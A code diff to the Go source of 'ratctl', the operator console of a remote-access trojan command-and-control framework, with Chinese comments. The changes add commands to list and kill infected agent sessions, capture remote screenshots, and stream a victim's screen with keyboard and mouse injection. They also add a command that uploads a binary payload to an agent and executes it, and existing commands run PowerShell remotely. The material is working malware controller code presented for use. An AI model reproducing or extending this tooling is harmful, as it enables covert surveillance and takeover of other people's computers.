@@ -5,6 +5,7 @@ import (
 	"bufio"
 	"fmt"
 	"os"
+	"strconv"
 	"strings"
 
 	"ratc2/internal/protocol"
@@ -64,6 +65,18 @@ func (st *shellState) dispatch(line string) bool {
 		st.curMu.Lock()
 		st.cur = ""
 		st.curMu.Unlock()
+	case "session", "info":
+		if len(args) < 1 {
+			fmt.Println("usage: session <agent_id>")
+		} else {
+			st.cmdSession(args[0])
+		}
+	case "kill":
+		if len(args) < 1 {
+			fmt.Println("usage: kill <agent_id>")
+		} else {
+			st.cmdKill(args[0])
+		}
 	case "sysinfo":
 		st.cmdSysinfo()
 	case "exec":
@@ -71,6 +84,25 @@ func (st *shellState) dispatch(line string) bool {
 			fmt.Println("usage: exec <powershell command>")
 		} else {
 			st.cmdExec(rest)
+		}
+	case "screenshot", "shot":
+		switch len(args) {
+		case 1:
+			st.cmdScreenshot("", args[0])
+		case 2:
+			st.cmdScreenshot(args[0], args[1])
+		default:
+			fmt.Println("usage: screenshot [agent_id] <local_file>")
+		}
+	case "screen", "viewer":
+		st.cmdScreen(args)
+	case "stop":
+		st.cmdStopStream()
+	case "payload", "pload":
+		if rest == "" {
+			fmt.Println("usage: payload <local_file> [remote_name] [--args <命令行参数>]")
+		} else {
+			st.cmdPayload(rest)
 		}
 	case "help", "?":
 		printHelp()
@@ -80,6 +112,31 @@ func (st *shellState) dispatch(line string) bool {
 		fmt.Printf("unknown command: %s (type 'help')\n", cmd)
 	}
 	return true
+}
+
+// resolveAgent 把 id 前缀解析为完整 agent id（先查缓存，未命中则刷新一次会话表）。
+func (st *shellState) resolveAgent(prefix string) (string, bool) {
+	if prefix == "" {
+		return "", false
+	}
+	for _, s := range st.sessions {
+		if strings.HasPrefix(s.ID, prefix) {
+			return s.ID, true
+		}
+	}
+	_, body, err := st.sendAndWait(protocol.CtlList, protocol.PluginCtl, nil,
+		protocol.CtlList, waitTimeout)
+	if err == nil {
+		if sessions, derr := decodeSessions(body); derr == nil {
+			st.sessions = sessions
+			for _, s := range sessions {
+				if strings.HasPrefix(s.ID, prefix) {
+					return s.ID, true
+				}
+			}
+		}
+	}
+	return "", false
 }
 
 // cmdSessions 列出在线 Agent（并缓存列表供 use 校验）。
@@ -116,38 +173,79 @@ func (st *shellState) cmdSessions() {
 
 // cmdUse 切换当前 Agent（id 需在最近 sessions 列表中存在）。
 func (st *shellState) cmdUse(id string) {
+	full, ok := st.resolveAgent(id)
+	if !ok {
+		fmt.Printf("[!] agent %q not found (run 'sessions' first)\n", id)
+		return
+	}
+	st.curMu.Lock()
+	st.cur = full
+	st.curMu.Unlock()
 	for _, s := range st.sessions {
-		if strings.HasPrefix(s.ID, id) {
-			st.curMu.Lock()
-			st.cur = s.ID
-			st.curMu.Unlock()
-			fmt.Printf("[*] switched to agent %s (os=%s)\n", s.ID, trunc(s.OS, 40))
+		if s.ID == full {
+			fmt.Printf("[*] switched to agent %s (os=%s)\n", full, trunc(s.OS, 40))
 			return
 		}
 	}
-	// 前缀匹配失败则尝试刷新一次列表再查
-	_, body, err := st.sendAndWait(protocol.CtlList, protocol.PluginCtl, nil,
-		protocol.CtlList, waitTimeout)
-	if err == nil {
-		if sessions, derr := decodeSessions(body); derr == nil {
-			st.sessions = sessions
-			for _, s := range sessions {
-				if strings.HasPrefix(s.ID, id) {
-					st.curMu.Lock()
-					st.cur = s.ID
-					st.curMu.Unlock()
-					fmt.Printf("[*] switched to agent %s\n", s.ID)
-					return
-				}
-			}
-		}
+	fmt.Printf("[*] switched to agent %s\n", full)
+}
+
+// cmdSession 查看单个 Agent 的会话详情（CTL_GET_SESSION，协议 §3.3）。
+func (st *shellState) cmdSession(prefix string) {
+	id, ok := st.resolveAgent(prefix)
+	if !ok {
+		fmt.Printf("[!] agent %q not found (run 'sessions' first)\n", prefix)
+		return
 	}
-	fmt.Printf("[!] agent %q not found (run 'sessions' first)\n", id)
+	// 注意：CTL_GET_SESSION 的 payload 是 agent_id 的 hex 字符串（C2 会话表按 hex 字符串索引）
+	_, body, err := st.sendAndWait(protocol.CtlGetSession, protocol.PluginCtl,
+		[]byte(id), protocol.CtlGetSession, waitTimeout)
+	if err != nil {
+		fmt.Printf("[!] %v\n", err)
+		return
+	}
+	sessions, err := decodeSessions(body)
+	if err != nil || len(sessions) == 0 {
+		fmt.Printf("[!] decode session: %v\n", err)
+		return
+	}
+	s := sessions[0]
+	online := "no"
+	if s.Online {
+		online = "yes"
+	}
+	fmt.Printf("agent_id : %s\n", s.ID)
+	fmt.Printf("ip:port  : %s:%d\n", s.IP, s.Port)
+	fmt.Printf("os       : %s\n", s.OS)
+	fmt.Printf("plugins  : 0x%08x\n", s.Plugins)
+	fmt.Printf("last_seen: %s\n", s.LastSeen.Format("2006-01-02 15:04:05"))
+	fmt.Printf("online   : %s\n", online)
+}
+
+// cmdKill 踢指定 Agent 下线（CTL_KILL_SESSION）。
+func (st *shellState) cmdKill(prefix string) {
+	id, ok := st.resolveAgent(prefix)
+	if !ok {
+		fmt.Printf("[!] agent %q not found (run 'sessions' first)\n", prefix)
+		return
+	}
+	_, _, err := st.sendAndWait(protocol.CtlKillSession, protocol.PluginCtl,
+		[]byte(id), protocol.CtlKillSession, waitTimeout)
+	if err != nil {
+		fmt.Printf("[!] %v\n", err)
+		return
+	}
+	st.curMu.Lock()
+	if st.cur == id {
+		st.cur = ""
+	}
+	st.curMu.Unlock()
+	fmt.Printf("[*] session killed: %s\n", id)
 }
 
 // cmdSysinfo 收集当前 Agent 系统信息。
 func (st *shellState) cmdSysinfo() {
-	status, text, err := st.execBusiness(protocol.CmdSysInfo, nil)
+	status, text, err := st.execBusiness(protocol.CmdSysInfo, protocol.PluginSys, nil)
 	if err != nil {
 		fmt.Printf("[!] %v\n", err)
 		return
@@ -164,7 +262,7 @@ func (st *shellState) cmdSysinfo() {
 
 // cmdExec 在当前 Agent 执行 PowerShell 命令。
 func (st *shellState) cmdExec(command string) {
-	status, text, err := st.execBusiness(protocol.CmdExecPs, []byte(command))
+	status, text, err := st.execBusiness(protocol.CmdExecPs, protocol.PluginSys, []byte(command))
 	if err != nil {
 		fmt.Printf("[!] %v\n", err)
 		return
@@ -179,19 +277,148 @@ func (st *shellState) cmdExec(command string) {
 	}
 }
 
+// cmdScreenshot 远程截屏并存盘（0x1001，响应为 JPEG 原始字节）。
+// idPrefix 为空时使用当前选中的 Agent。
+func (st *shellState) cmdScreenshot(idPrefix, localFile string) {
+	agentID := ""
+	if idPrefix == "" {
+		cur, err := st.currentAgentIDHex()
+		if err != nil {
+			fmt.Printf("[!] %v\n", err)
+			return
+		}
+		agentID = cur
+	} else {
+		id, ok := st.resolveAgent(idPrefix)
+		if !ok {
+			fmt.Printf("[!] agent %q not found (run 'sessions' first)\n", idPrefix)
+			return
+		}
+		agentID = id
+	}
+	fmt.Printf("[*] capturing screen from %s ...\n", shortID(agentID))
+	status, body, err := st.businessRawTo(agentID, protocol.CmdScreenshot,
+		protocol.PluginRemote, nil, waitTimeout)
+	if err != nil {
+		fmt.Printf("[!] %v\n", err)
+		return
+	}
+	if status != protocol.StatusOK {
+		fmt.Printf("[!] agent status=%d: %s\n", status, trunc(string(body), 200))
+		return
+	}
+	if err := os.WriteFile(localFile, body, 0o644); err != nil {
+		fmt.Printf("[!] write %s: %v\n", localFile, err)
+		return
+	}
+	fmt.Printf("[*] screenshot saved: %s (%d bytes)\n", localFile, len(body))
+}
+
+// cmdScreen 拉起 viewer 显示远程屏幕（viewer 自己发起 0x1002 屏幕流）。
+// 用法：screen [agent_id] [fps] [quality] [scale]
+// 说明：屏幕流必须由发起 0x1002 的那条 ctl 连接接收（C2 按连接配对），
+//       因此这里只负责启动 viewer，流由 viewer 自己的连接建立。
+func (st *shellState) cmdScreen(args []string) {
+	agentID := ""
+	params := args
+	if len(args) > 0 && !isNumeric(args[0]) {
+		id, ok := st.resolveAgent(args[0])
+		if !ok {
+			fmt.Printf("[!] agent %q not found (run 'sessions' first)\n", args[0])
+			return
+		}
+		agentID = id
+		params = args[1:]
+	} else {
+		cur, err := st.currentAgentIDHex()
+		if err != nil {
+			fmt.Println("usage: screen [agent_id] [fps] [quality] [scale]  （需先 use <id>）")
+			return
+		}
+		agentID = cur
+	}
+
+	fps, quality, scale := 25, 70, 100
+	if len(params) > 0 {
+		fps = atoiOr(params[0], fps)
+	}
+	if len(params) > 1 {
+		quality = atoiOr(params[1], quality)
+	}
+	if len(params) > 2 {
+		scale = atoiOr(params[2], scale)
+	}
+	if fps <= 0 || fps > 60 {
+		fps = 25
+	}
+	if quality <= 0 || quality > 100 {
+		quality = 70
+	}
+	if scale <= 0 || scale > 100 {
+		scale = 100
+	}
+	fmt.Printf("[*] launching viewer for %s (fps=%d quality=%d scale=%d%%) ...\n",
+		shortID(agentID), fps, quality, scale)
+	if err := st.launchViewer(agentID, fps, quality, scale); err != nil {
+		fmt.Printf("[!] %v\n", err)
+	}
+}
+
+// cmdStopStream 停止当前 Agent 的屏幕流（0x1002 control=0，兜底清理 viewer 异常退出）。
+func (st *shellState) cmdStopStream() {
+	// payload（去掉 agent_id 前缀后）：控制(1B) + fps + quality + scale
+	args := []byte{0, 25, 70, 100}
+	status, text, err := st.execBusiness(protocol.CmdScreenStream, protocol.PluginRemote, args)
+	if err != nil {
+		fmt.Printf("[!] %v\n", err)
+		return
+	}
+	if status != protocol.StatusOK {
+		fmt.Printf("[!] agent status=%d: %s\n", status, trunc(text, 200))
+		return
+	}
+	fmt.Printf("[*] %s\n", strings.TrimSpace(text))
+}
+
+func isNumeric(s string) bool {
+	if s == "" {
+		return false
+	}
+	_, err := strconv.Atoi(s)
+	return err == nil
+}
+
+func atoiOr(s string, def int) int {
+	n, err := strconv.Atoi(s)
+	if err != nil {
+		return def
+	}
+	return n
+}
+
 func printHelp() {
-	fmt.Println(`ratctl - C2 交互式控制端（beacon 信道）
+	fmt.Println(`ratctl - C2 交互式控制端
 
 会话管理:
   sessions                  列出在线 Agent
   use <agent_id>            切换到目标 Agent（支持前缀匹配）
   back                      退出当前 Agent
+  session <agent_id>        查看单个会话详情
+  kill <agent_id>           踢 Agent 下线（关闭其连接）
 
-当前 Agent 操作（需先 use）:
+当前 Agent 操作（需先 use，或直接给出 agent_id）:
   sysinfo                   收集系统信息
   exec <command>            执行 PowerShell 命令
+  screenshot [id] <file>    远程截屏并保存为 JPEG 文件
+  screen [id] [fps] [quality] [scale]   拉起 viewer 查看/操作远程屏幕
+                            （默认 25 70 100；viewer 负责建流与键鼠注入）
+  stop                      停止当前 Agent 的屏幕流
+  payload <file> [name] [--args <参数>]
+                            上传本地二进制 payload 到 Agent 并执行（协议 §10）
 
 通用:
   help / ?                  显示本帮助
-  exit / quit               退出`)
+  exit / quit               退出
+
+全局参数: ratctl [-s host:port] [-viewer <viewer.exe 路径>]`)
 }
